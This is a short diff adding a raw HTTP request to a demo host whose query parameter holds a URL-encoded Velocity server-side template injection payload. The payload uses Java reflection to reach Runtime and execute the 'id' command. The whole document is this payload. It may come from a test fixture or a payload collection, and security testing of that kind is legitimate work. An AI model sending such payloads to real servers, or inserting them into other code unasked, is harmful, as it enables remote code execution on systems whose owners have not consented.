@@ -1,0 +1,4 @@
+GET /a?input=%23set($x%3D\u0022\u0022)$x.getClass().forName(\u0022java.lang.Runtime\u0022).getRuntime().exec(\u0022id\u0022) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
